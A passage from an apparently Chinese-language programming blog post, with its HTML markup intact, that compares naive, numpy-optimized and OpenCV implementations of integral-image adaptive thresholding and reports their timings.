    &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;csum&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;csum&lt;/span&gt; &lt;span class="o"&gt;+=&lt;/span&gt; &lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;csum&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;csum&lt;/span&gt;

    &lt;span class="n"&gt;half_s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;//&lt;/span&gt; &lt;span class="mi"&gt;2&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;x1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;max&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="o"&gt;+&lt;/span&gt;&lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;y1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;max&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;field_sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
            &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;field_sum&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uint8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
mat是我们的图片矩阵， boxsize是区域的长度， 必须是奇数。 &lt;br /&gt;
每个点都在周围取一个boxsize长度的矩形， 要特别处理边界， 让他不要超出累积矩阵。&lt;br /&gt;
很直观的代码， 纯翻译自论文里面的伪代码。  &lt;/p&gt;
&lt;p&gt;看看速度：&lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
Image shape 640x480
intuitive_method take 1658.280885 ms  
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
1600ms, （怎么和说好的15ms不一样）。&lt;/p&gt;
&lt;h2 id="_4"&gt;&lt;a name="user-content-_4" href="#_4" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;改进的直观方法&lt;/h2&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;optimized_intuitive_method&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;
    &lt;span class="n"&gt;integral_map&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;zeros_like&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;dtype&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cumsum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;cumsum&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;out&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="n"&gt;half_s&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt; &lt;span class="o"&gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;
    &lt;span class="n"&gt;inv_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;
    &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;for&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="nb"&gt;range&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;h&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
            &lt;span class="n"&gt;x1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;max&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;x2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;y1&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;max&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;y2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;min&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;half_s&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;field_sum&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;integral_map&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="n"&gt;count&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;x2&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;x1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;y2&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;y1&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;item&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;count&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;field_sum&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
                &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;itemset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
            &lt;span class="k"&gt;else&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
                &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;itemset&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;i&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;j&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;inv_value&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;ret&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;uint8&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;T&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Numpy提供了item和itemset方法来加速对矩阵上单个点的操作。&lt;br /&gt;
同时两次累积和实际可以用可以用&lt;code&gt;np.cumsum&lt;/code&gt;来计算， 但是这里有一个小细节，&lt;br /&gt;
单纯的使用两次&lt;code&gt;a=np.cumsum(...)&lt;/code&gt;会额外进行一次内部的内存拷贝， 我们要指定&lt;code&gt;out&lt;/code&gt;参数来阻止多余的内存拷贝.&lt;/p&gt;
&lt;p&gt;在计算half_s的时候， 使用移位&lt;code&gt;boxsize &amp;gt;&amp;gt; 1&lt;/code&gt;来加速。  &lt;/p&gt;
&lt;p&gt;&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;⇒  python3 implement.py
Image shape 640x480
optimized_intuitive_method take 823.928799 ms
&lt;/pre&gt;&lt;/div&gt;
&lt;br /&gt;
快了一倍， 但是还是不够&lt;/p&gt;
&lt;h2 id="_5"&gt;&lt;a name="user-content-_5" href="#_5" class="headeranchor-link" aria-hidden="true"&gt;&lt;span class="headeranchor"&gt;&lt;/span&gt;&lt;/a&gt;猥琐法&lt;/h2&gt;
&lt;p&gt;不妨让我们直接退化到累积和的优化之前，纯粹的暴力计算，所有计算都交给opencv， 看看会发生什么事情。&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;opencv_way&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;w&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;h&lt;/span&gt; &lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;astype&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nb"&gt;int&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;inv_value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;set_value&lt;/span&gt; &lt;span class="o"&gt;^&lt;/span&gt; &lt;span class="mi"&gt;255&lt;/span&gt;
    &lt;span class="n"&gt;kernel&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;ones&lt;/span&gt;&lt;span class="p"&gt;((&lt;/span&gt;&lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;))&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt;&lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;threshold&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;&lt;span class="o"&gt;/&lt;/span&gt;&lt;span class="mi"&gt;100&lt;/span&gt; &lt;span class="o"&gt;/&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="n"&gt;boxsize&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;result&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;cv&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;filter2D&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="mi"&gt;1&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;kernel&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;ret&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;np&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;where&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;mat&lt;/span&gt; &lt;span class="o"&gt;&amp;lt;&lt;/span&gt; &lt;span class="n"&gt;result&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;set_value&lt;/span&gt;&lt;span class="p"&gt;],&lt;/span&gt; &lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="n"&gt;inv_value&lt;/span&gt;&lt;span class="p"&gt;])&lt;/span&gt;
